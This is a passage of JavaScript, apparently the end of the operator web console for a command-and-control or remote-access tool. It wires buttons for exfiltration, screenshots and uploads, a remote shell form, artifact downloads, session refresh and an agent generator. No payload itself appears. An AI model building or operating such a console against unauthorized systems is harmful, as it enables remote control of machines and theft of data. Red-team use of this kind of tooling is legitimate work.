  $("#btn-exfil").addEventListener("click", queueExfil);
  $("#btn-screenshot").addEventListener("click", queueScreenshot);
  $("#btn-upload").addEventListener("click", queueUpload);

  $("#shell-form").addEventListener("submit", (e) => {
    e.preventDefault();
    runCommand(true);
  });

  bindShellInputCompletion();

  $("#shell-output").addEventListener("click", (e) => {
    const link = e.target.closest("a.artifact-download");
    if (!link) return;
    e.preventDefault();
    downloadArtifactEntry({
      artifact_url: link.dataset.artifactUrl,
      remote_path: link.dataset.downloadName,
    }).catch((err) => {
      appendShellError(err.message || String(err));
    });
  });

  document.addEventListener("visibilitychange", () => {
    if (document.visibilityState === "visible" && state.token && !$("#app").classList.contains("hidden")) {
      refreshSessions().catch(() => {});
      fetchSessionHistory().catch(() => {});
    }
  });

  if (typeof window.initAgentGenerator === "function") {
    window.initAgentGenerator();
  }

  initSidebarResize();

  if (state.token) {
    $("#token-input").value = state.token;
    connect();
  } else {
    showLogin();
  }
});
